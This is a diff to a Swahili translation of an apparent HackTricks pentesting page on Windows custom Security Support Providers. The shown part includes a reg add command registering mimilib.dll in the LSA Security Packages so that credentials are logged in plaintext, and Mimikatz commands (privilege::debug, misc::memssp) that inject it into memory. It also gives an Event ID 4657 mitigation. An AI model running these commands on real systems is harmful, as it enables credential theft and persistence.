@@ -19,15 +19,15 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Ongeza `mimilib.dll` kwenye orodha ya Watoa Huduma za Usalama (Security Packages):
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 Na baada ya kuanzisha upya, akreditivu zote zinaweza kupatikana kwa maandiko wazi katika `C:\Windows\System32\kiwissp.log`
 
 #### Katika kumbukumbu
 
-Unaweza pia kuingiza hii moja kwa moja katika kumbukumbu ukitumia Mimikatz (zingatia kwamba inaweza kuwa na kutokuwa thabiti/kutofanya kazi):
-```powershell
+Unaweza pia kuingiza hii moja kwa moja katika kumbukumbu ukitumia Mimikatz (zingatia kwamba inaweza kuwa na utata kidogo/isiweze kufanya kazi):
+```bash
 privilege::debug
 misc::memssp
 ```
@@ -35,6 +35,6 @@ Hii haitadumu baada ya kuanzisha upya.
 
 #### Mitigation
 
-Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+Event ID 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
 
 {{#include ../../banners/hacktricks-training.md}}
